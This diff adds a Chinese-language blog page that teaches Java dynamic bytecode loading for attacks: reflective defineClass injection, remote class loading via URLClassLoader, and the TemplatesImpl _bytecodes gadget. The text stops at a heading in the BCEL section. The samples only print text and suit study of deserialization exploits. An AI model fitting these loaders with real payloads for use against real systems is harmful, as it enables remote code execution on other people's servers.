@@ -1,0 +1,961 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      动态加载字节码 | Su@sU的世界
+    
+  </title>
+  <meta name="author" content="Su@sU">
+  <meta name="keywords" content="web 游戏" />
+  <meta name="description" content="一个什么都感兴趣的人的胡思乱想" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'normal',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 110,
+      randomYouSrc: 'https://sariay.github.io/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「动态加载字节码」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-zhihu"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-sina-weibo "></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-pinterest2"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" itemprop="url">
+		动态加载字节码
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" itemprop="url">
+		<time datetime="2026-06-30T04:00:00.000Z" itemprop="dateUpdated">
+	  		2026-06-30
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+						
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<p>动态加载字节码是一种让JVM可以接收由程序在运行时动态产生的字节数组并将其装在的能力 本义是让程序变得更加灵活 但是也产生了一定的安全问题</p>
+<h2 id="核心方法"><a href="#核心方法" class="headerlink" title="核心方法"></a>核心方法</h2><p>在<code>java.lang.ClassLoader</code>类中有一个方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)</span><br></pre></td></tr></table></figure>
+<p>其作用是将一个符合JVM贵哦饭的Class文件字节码byte数组 转换成一个<code>java.lang.Class</code>的实例<br>听上去人畜无害 但是由于其直接跳过“从文件系统加载”的步骤 接收任何来源的合法字节数组 那么攻击者就可以生成符合规范的i解码 通过它生成我们的恶意实例<br>我们后文所介绍的几种动态加载字节码的姿势 最终都要落到defineClass这一步</p>
+<h2 id="DefineClass"><a href="#DefineClass" class="headerlink" title="DefineClass"></a>DefineClass</h2><p>在java之中字节码文件的加载需要ClassLoader之中的三个方法</p>
+<ul>
+<li>LoadClass：从已经加载的类缓存 父加载器这些位置寻找类 （利用双亲委派机制）如果没找到 执行FindClass</li>
+<li>FindClass：根据基础URL指定的方式加载类的字节码 寻找范围包括本地文件系统 jar包 远程hrrp服务器 然后交给defineClass</li>
+<li>defineClass：处理前面传入的字节码 将其处理成真正的java类</li>
+</ul>
+<p>我们来编写一段代码来试试看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">  </span><br><span class="line">public class DefineClassAttack &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        // 假设我们有恶意类的字节码（Base64编码，这里直接硬编码示意）  </span><br><span class="line">        byte[] evilBytes = Base64.getDecoder().decode(  </span><br><span class="line">                &quot;yv66vgAAADQAHgoABgAQCQARABIIABMKABQAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARTGphdmFfY2xhc3MvRXZpbDsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAHAAgHABgMABkAGgEABGtvYmUHABsMABwAHQEAD2phdmFfY2xhc3MvRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAEAAQAHAAgAAQAJAAAAPwACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAIACgAAAA4AAwAAAAQABAAFAAwABgALAAAADAABAAAADQAMAA0AAAABAA4AAAACAA8=&quot;); // 实际的 Evil.class 字节码  </span><br><span class="line">  </span><br><span class="line">        // 获取一个 ClassLoader 实例，这里用系统类加载器  </span><br><span class="line">        ClassLoader sysLoader = ClassLoader.getSystemClassLoader();  </span><br><span class="line">        // 反射获取 defineClass 方法  </span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(  </span><br><span class="line">                &quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);  </span><br><span class="line">        defineClass.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 调用 defineClass 注入恶意类，名称建议带包名保持一致  </span><br><span class="line">        Class&lt;?&gt; evilClass = (Class&lt;?&gt;) defineClass.invoke(  </span><br><span class="line">                sysLoader, &quot;java_class.Evil&quot;, evilBytes, 0, evilBytes.length);  </span><br><span class="line">  </span><br><span class="line">        // 此时 Evil 类的静态代码块并未执行！  </span><br><span class="line">        // 需要显式触发初始化，两种方式：  </span><br><span class="line">        // 1. 调用 newInstance()，这会触发静态初始化 + 构造方法  </span><br><span class="line">        // 2. 直接触发类的初始化：Class.forName(evilClass.getName(), true, sysLoader)  </span><br><span class="line">        evilClass.newInstance(); // 这才真正执行恶意代码  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中那一串Base64编码是由Evil.java通过javac编译出来的Evil.class文件Base64编码得到</p>
+<p>简单分析一下这一段代码</p>
+<ul>
+<li>首先传入一段class文件的base64编码内容 然后将其解码 也就是得到一个class文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 获取一个 ClassLoader 实例，这里用系统类加载器  </span><br><span class="line">ClassLoader sysLoader = ClassLoader.getSystemClassLoader();  </span><br><span class="line">// 反射获取 defineClass 方法  </span><br><span class="line">Method defineClass = ClassLoader.class.getDeclaredMethod(  </span><br><span class="line">        &quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);  </span><br><span class="line">defineClass.setAccessible(true);  </span><br></pre></td></tr></table></figure>
+<p>这两段就是在获得加载器和defineClass方法 注意由于这个方法是私有方法 我们需要使用反射并利用setAccessible获得权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 调用 defineClass 注入恶意类，名称建议带包名保持一致  </span><br><span class="line">Class&lt;?&gt; evilClass = (Class&lt;?&gt;) defineClass.invoke(  </span><br><span class="line">        sysLoader, &quot;java_class.Evil&quot;, evilBytes, 0, evilBytes.length);</span><br></pre></td></tr></table></figure>
+<p>这一段是核心部分<br>其核心目的就是通过反射调用defineClass方法 将前面传入的class定义为一个真正的java类 并获取这个类的class对象<br>再反射之中method.invoke方法的作用是再指定的对象上用指定的参数调用该方法 第一个传入的参数是目标对象 后面的是参数</p>
+<p>对应到我们的代码就是：</p>
+<ul>
+<li><p><strong>目标对象</strong>：<code>sysLoader</code>（一个 <code>ClassLoader</code> 实例，这里是系统类加载器）</p>
+</li>
+<li><p><strong>参数列表</strong>：</p>
+<ul>
+<li><p>第 1 个参数：<code>&quot;java_class.Evil&quot;</code> → 类名</p>
+</li>
+<li><p>第 2 个参数：<code>evilBytes</code> → 字节数组</p>
+</li>
+<li><p>第 3 个参数：<code>0</code> → 字节数组的起始偏移量</p>
+</li>
+<li><p>第 4 个参数：<code>evilBytes.length</code> → 要读取的字节数量</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>其实整段代码也就相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysLoader.defineClass(&quot;java_class.Evil&quot;, evilBytes, 0, evilBytes.length);</span><br></pre></td></tr></table></figure>
+<p>注意原代码使用强制类型住那混啊 将不确定的返回值转换成Class</p>
+<p>后面三个参数暂且不表 注意类的全限定名这一块 如果定义类的时候是在包之中定义的 那么类的全限定名要加上包名</p>
+<img src="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/define.png" class="" title="define">
+
+
+<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>这是JDK官方提供的 专门从URL路径加载类的类加载器<br>其是<code>java.lang.ClassLoader</code>的一个具体子类 核心作用在于从一组URL指向位置查找并加载类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public class URLClassLoader extends ClassLoader &#123;</span><br><span class="line">    //  这是一个构造函数 传入一个 URL 数组，这些 URL 就是类的“搜索路径”</span><br><span class="line">    public URLClassLoader(URL[] urls, ClassLoader parent) &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>值得注意的是 此处的URL不仅仅指http&#x2F;https协议 还可以是file协议等</p>
+<h3 id="查找流程"><a href="#查找流程" class="headerlink" title="查找流程"></a>查找流程</h3><p>URLClassLoader本质重写findClass方法以实现“从URL路径加载”的逻辑<br>大致过程：</p>
+<ul>
+<li>类全名转换成路径 如：<code>java_class.Test</code>-&gt;<code>java_class/Test.class</code></li>
+<li>遍历URL 逐一尝试构造函数时候传入的URL数组</li>
+<li>将URL和第一步产生的路径拼接构造出完整的资源地址</li>
+<li>打开连接读取字节</li>
+<li>将读取到的<code>byte[]</code>字节数组传给defineClass 通过其完成字节码到类对象的转换工作</li>
+<li>缓存类</li>
+</ul>
+<h3 id="实例操作"><a href="#实例操作" class="headerlink" title="实例操作"></a>实例操作</h3><p>我们先编写两个Java文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">import java.net.MalformedURLException;  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">import java.net.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line">public class LoaderTest &#123;  </span><br><span class="line">    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException&#123;  </span><br><span class="line">        //攻击者可控的资源地址</span><br><span class="line">        URL[] urls=&#123;new URL(&quot;http://localhost:8080/&quot;)&#125;;  </span><br><span class="line">        //创建一个类加载器实例</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);  </span><br><span class="line">        //触发攻击点</span><br><span class="line">        Class&lt;?&gt; c = loader.loadClass(&quot;java_class.Test&quot;);  </span><br><span class="line">        //加载完成后初始化</span><br><span class="line">        c.newInstance();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个文件实现对目标URL的加载逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public Test()&#123;  </span><br><span class="line">        System.out.println(&quot;loader test&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h4><p>首先在文件目录下启动cmd 将其编译成class文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java</span><br></pre></td></tr></table></figure>
+<p>接着启动http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080//适用于python3</span><br></pre></td></tr></table></figure>
+<p>完成之后直接在IDEA之中运行LoaderTest就可以看到成功输出loadertest</p>
+<img src="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/url.png" class="" title="url">
+<p>这就证明了URLClassLoader的远程·加载能力<br>这就说明如果我们能够控制目标java ClassLoader的基础路径是一个http服务器 就可以利用远程加载的方式执行RCE</p>
+<h2 id="Templateslmpl"><a href="#Templateslmpl" class="headerlink" title="Templateslmpl"></a>Templateslmpl</h2><p>这是Java的一个控制存储XSLT的特殊类<br>它的核心工作流程是当输入一段XSLT源码的时候 其内部会动态编译这份源码 生成一个java类 然后实例化这个类来完成XML到另一种形式（诸如HTML等）的转换<br>其会存储XSLT样式表编译之后的translet字节码（_bytecodes字段） 并在其defineTransletClasses（）方法之中创建TransletClassLoader示例 调用其defineClass方法加载字节码 ——这就是为什么我们选择这个类作为攻击类</p>
+<p>我们要做的就是</p>
+<ul>
+<li>创建一个空的TemplatesImpl对象 利用反射将恶意字节码塞入其_bytecodes字段</li>
+<li>调用newTransformer（） 触发XSLT转换流程 </li>
+<li>此时这个XSLT转换流程就会将我们传入的恶意代码当成正常的XSLT加载实例化 </li>
+<li>最终触发恶意代码<br>以下代码可以作为一个证明</li>
+</ul>
+<p>我们先定义一个恶意类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line">public class EvilTeml extends AbstractTranslet &#123;  </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers)  </span><br><span class="line">            throws TransletException &#123;  </span><br><span class="line">    &#125;  //继承的</span><br><span class="line">  </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)  </span><br><span class="line">            throws TransletException &#123;  </span><br><span class="line">    &#125;  //继承的</span><br><span class="line">  </span><br><span class="line">    public EvilTeml() &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        System.out.println(&quot;Hello Su@sU&quot;);  </span><br><span class="line">    &#125;//恶意代码  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意这个类必须继承于AbstractTranslet类<br>因为TemplatesTmpl在defineTransletClasses的筛选逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (AbstractTranslet.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    _class[i] = clazz;   // 只有 AbstractTranslet 的子类才会被存入 _class 数组</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且之后再getTransletInstance里面会执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[0].newInstance();</span><br></pre></td></tr></table></figure>
+<p>那么如果加载的类不是AbstractTranslet的子类 它根本不会被存入_class数组 后续也就不会被实例化</p>
+<p>接着将这个恶意类的class文件Base64编码<br>在以下代码之中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">  </span><br><span class="line">public class Teml &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">// source: bytecodes/HelloTemplateImpl.java  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABU...&quot;);  </span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;EvilTeml&quot;);  </span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">        obj.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们来分析一下上述代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABU...&quot;);  </span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);  </span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;EvilTeml&quot;);  </span><br><span class="line">setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">obj.newTransformer(); </span><br></pre></td></tr></table></figure>
+<p>这一段 首先将一个字节流数组赋值我们的恶意class文件的Base64编码<br>然后创建了一个空白的TemplatesImpl对象 此时其属性为null</p>
+<p>现在我们要为其中的三个关键属性赋值<br>首先<code>_bytecodes</code>这个最关键的 包含我们的恶意类的变量子不用说 肯定是要赋值的<br>其次<code>_name</code>这个属性 我们设置为恶意变量同名 方便精准定位<br>最后<code>_tfactory</code>这个属性我们设置成TransformerFactoryImpl对象 因为<code>defineTransletClasses()</code> 内部会通过 <code>_tfactory.getFactory()</code> 获取类加载器用于创建 <code>TransletClassLoader</code> 若为 null 且自动赋值失败就会 NPE 所以手动赋值最保险<img src="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/t1.png" class="" title="t1"></p>
+<p>那么现在在这个我们定义的TemplatesImpl对象的属性之中已经含有了我们的恶意类但是并没有被触发啊 我们可能首先会想 直接使用<code>obj.newInstance</code>触发它 但是实际上 此时的obj本身就是一个普通的java对象 它并不包含什么恶意代码 你无论如何初始化都不会触发属性之中那个类的恶意代码（此时这个类还只是字节码而不是完整的类）<br>那么我们就要使用newTransformer方法 这个方法会调用TemplatesImpl之中的一个私有方法：getTransletInstance（）<img src="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/t2.png" class="" title="t2"><br>可以看到如果还没有定义过 translet 类，就先去调用 <code>defineTransletClasses()</code> 进行定义和筛选 那么就会调用defineTransletClasses（）方法 这个方法就会将<code>obj._bytecodes</code>之中的恶意类给实例化触发<br>所以说这个newTransformer()的触发逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">newTransformer()</span><br><span class="line"> └─ getTransletInstance() </span><br><span class="line"> ├─ 若 _class == null，调用 defineTransletClasses() </span><br><span class="line"> │ ├─ TransletClassLoader.defineClass(_bytecodes[i]) // 加载恶意字节码 </span><br><span class="line"> │ ├─ 检查类是否继承 AbstractTranslet </span><br><span class="line"> │ └─ 若其简单名与 _name 相等，存入 _class[i] </span><br><span class="line"> └─ _class[0].newInstance()</span><br></pre></td></tr></table></figure>
+<p>这样一来就触发了我们的恶意代码<img src="/2026/06/30/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/t3.png" class="" title="t3"></p>
+<h2 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h2><p>BCEL是Apache Commons项目之下的一个子项目 其提供两个类</p>
+<ul>
+<li>Repository：用于将一个java Class转化成字节码（作用类似于javac）</li>
+<li>Utility：用于将原生的字节码转换成BCEL格式字节码</li>
+</ul>
+<p>其实这个BCELClassLoader的利用机制也就是将字节码转换成一种特殊形式（BCEL）的编码 这个BCELCLassLoader在调用loadClass都时候 其内部的loadClass方法会检测到一个特殊的前缀（<code>$$BCEL$$</code>） 当识别到这个前缀的时候 loadClass会截取前缀之后的部分 通过内部的<code>createClass方法</code>将这一段特殊的BCEL编码解码会原始的字节码</p>
+<p>我们可以来了解一下BCEL攻击需要导入什么包</p>
+<ul>
+<li><code>com.sun.org.apache.becl.internal.util.ClassLoader</code>:在攻击类之中导入 这是整个过程的核心 一个特殊的类加载器 负责识别和加载我们构造的BCEL格式字符串 （com.sun开头 说明它们是JDK内部专用的API ）</li>
+<li><code>com.sun.org.apache.bcel.intenal.classfile.Utility</code>：在BCEL构造类之中使用 这是一个工具类 其encode方法能够将class文件的原始字节码转换成BCEL格式的字符串</li>
+<li><code>java.nio.file.Files/java.nio.file.Paths</code>:这是Java标准库之中的类 用于从磁盘上方便的读取class文件到byte数组 这是调用Utility.encode的前提</li>
+</ul>
+<p>我们来完成这个攻击的示例<br>我们需要三个类<br><strong>恶意攻击类</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package java_class;  </span><br><span class="line">  </span><br><span class="line">public class EvilBCEL &#123;  </span><br><span class="line">    static &#123;  </span><br><span class="line">        System.out.println(&quot;Hello Su@sU&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>BCEL编码类</strong></p>
